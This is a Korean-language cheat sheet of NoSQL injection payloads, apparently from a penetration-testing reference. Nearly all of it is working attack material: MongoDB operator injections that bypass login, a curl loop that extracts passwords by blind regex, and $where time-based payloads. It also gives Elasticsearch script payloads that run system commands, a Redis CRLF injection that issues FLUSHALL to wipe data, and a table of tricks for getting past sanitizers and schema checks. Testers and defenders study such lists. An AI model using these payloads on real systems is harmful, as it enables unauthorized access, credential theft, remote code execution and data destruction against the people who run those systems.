### 기본 페이로드

#### MongoDB Operator Injection (JSON body, 인증 우회)
```json
{"username":"admin","password":{"$ne":""}}
{"username":"admin","password":{"$ne":null}}
{"username":"admin","password":{"$gt":""}}
{"username":"admin","password":{"$exists":true}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
{"username":{"$in":["admin","root","administrator"]},"password":{"$ne":""}}
```

#### MongoDB Query string (qs `extended:true`)
```
?username=admin&password[$ne]=
?username=admin&password[$regex]=^a
?filter[$where]=this.role%3D%3D%27admin%27
?user[$ne]=null&password[$ne]=null
```

**MongoDB `$where` JS 실행** (`SERVER_SIDE_JS` 라벨):
```json
{"$where":"this.username == 'admin'"}
{"$where":"function(){return this.role == 'admin'}"}
{"$where":"sleep(3000)"}
{"$where":"function(){var d=new Date();while((new Date())-d<3000){}; return true}"}
```

#### MongoDB Aggregation 인젝션
```json
{"$or":[{"username":"admin"},{"role":"admin"}]}
{"name":{"$regex":"^.*","$options":"i"}}
```

#### Blind extraction ($regex)
```bash
# 첫 글자 추측
for c in {a..z}; do
  curl -s -X POST "https://target/api/login" -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}" | grep -c success
done

# substring 위치 추출
{"username":"admin","password":{"$regex":"^pass"}}
```

#### Elasticsearch Painless script
```json
{"query":{"script_score":{"script":{"source":"Runtime.getRuntime().exec(\"id\")"}}}}
{"query":{"function_score":{"script_score":{"script":"java.lang.Runtime.getRuntime().exec('id')"}}}}
{"script_fields":{"x":{"script":{"source":"java.lang.Runtime.getRuntime().exec('id')"}}}}
```

#### Redis 명령 인젝션 (CRLF 결합)
```
?key=foo%0d%0aFLUSHALL%0d%0a
?key=foo%0d%0aSET%20admin%201%0d%0a
```

#### CouchDB
```json
{"selector":{"$or":[{"role":"admin"},{"_id":{"$gt":""}}]}}
```

#### Cassandra/CQL (sqli-scanner 페이로드 일부 적용)
```
' OR 1=1 ALLOW FILTERING; --
```

#### DynamoDB PartiQL
```
SELECT * FROM Users WHERE name = 'admin' OR 1=1
```

#### Time-based Blind (MongoDB `$where`)
```json
{"username":"admin","$where":"function(){var d=new Date();while((new Date())-d<5000){}; return true}"}
```

#### Operator Injection in nested key
```json
{"user":{"$ne":null},"profile":{"settings":{"$ne":null}}}
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| `mongo-sanitize` (`$` prefix만 차단) | `.` 표기 — `{"user.role":"admin"}`, nested 객체 `{"user":{"role":"admin"}}` |
| String cast (`String(x)`) | `JSON.stringify`/`parse` 라운드트립 후 객체 복원되는 경로 우회 |
| Mongoose Schema 검증 | `findById`/`findByIdAndUpdate` raw 메서드 (schema validator 미적용) |
| `$where` 차단 | `$expr` + `$function` (4.4+), `$accumulator`, `$regex` Blind, `$or`/`$and` 조합 |
| ES `script.allowed_types: stored` | Stored script ID 추측 — 일반적 ID 패턴 brute force |
| `strictQuery: 'throw'` (Mongoose 7+) | DTO 검증 누락된 필드로 우회 |
| Field allowlist | dot notation 우회 (`{"obj.subfield":"x"}`) |
| Operator 키워드 차단 (`$ne`/`$gt`) | `$nin`, `$not`, `$elemMatch`, `$jsonSchema` 같은 미차단 operator |
| JSON body만 검증 | Query string에서 `qs` 객체 reconstruct로 동일 영향 |
| Unicode escape | `\u0024ne` (= `$ne`) — JSON 파서 디코딩 후 통과 |

#### Encoding 변형
```
# URL encode
?password%5B%24ne%5D=  (= ?password[$ne]=)

# Unicode escape (일부 파서)
{"\u0024where":"..."}
```

---

### 참고사항

- Express 기본 `qs` parser (`extended:true`)는 중첩 객체 생성 — query string으로도 operator injection 가능
- 인증 endpoint (`/login`/`/auth`)에서 password 비교가 직접 쿼리에 들어가면 `{$ne:""}` 한방
- MongoDB `$where`는 서버 JS 비활성화 (`--noscripting`/`security.javascriptEnabled: false`) 환경에선 차단 — 버전/설정 확인
- Elasticsearch는 search-as-you-type, scripted_metric, runtime mappings에 사용자 입력 허용 시 RCE 게이트
- ES inline script는 7.x+ 기본 비활성 — `script.allowed_types: inline` 명시 시만 가능
- Cassandra/CQL은 SQL 유사 — sqli-scanner 페이로드 일부 적용 가능
- DynamoDB는 `ExpressionAttributeValues` 우회보다 PartiQL injection 주의
- mongo-sanitize 미들웨어가 `app.use()` 위치보다 raw body parser 후에 있는지 순서 확인
- Mongoose `strictQuery: false` 환경은 미정의 필드도 쿼리 허용
- CouchDB Map/Reduce에 사용자 함수 정의 시 RCE 게이트
- `$where` Time-based는 sleep 함수 없음 — busy loop (`while(...){}`) 사용
- Blind extraction은 `$regex` 첫 글자 → 두 번째 → ... 순차 — 응답 차이로 추출
- 인증 우회 검증은 다중 사용자 (admin/일반) 비교로 정확히 판정
- `$expr`/`$function`은 MongoDB 4.4+ — 버전 확인 후 시도
